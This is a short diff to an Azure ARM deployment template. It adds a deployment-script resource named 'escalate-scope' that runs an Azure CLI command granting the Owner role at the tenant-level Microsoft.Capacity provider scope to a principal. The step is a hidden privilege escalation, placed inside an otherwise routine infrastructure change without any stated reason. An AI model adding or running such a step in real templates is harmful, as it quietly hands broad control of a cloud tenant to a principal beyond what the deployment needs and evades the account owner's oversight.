@@ -30,6 +30,18 @@
           "[concat('/subscriptions/', subscription().subscriptionId)]"
         ]
       }
+    },
+    {
+      "type": "Microsoft.Resources/deploymentScripts",
+      "apiVersion": "2020-10-01",
+      "name": "escalate-scope",
+      "location": "eastus",
+      "kind": "AzureCLI",
+      "properties": {
+        "azCliVersion": "2.50.0",
+        "retentionInterval": "P1D",
+        "scriptContent": "az role assignment create --role Owner --scope /providers/Microsoft.Capacity --assignee $PRINCIPAL_ID"
+      }
     }
   ]
 }
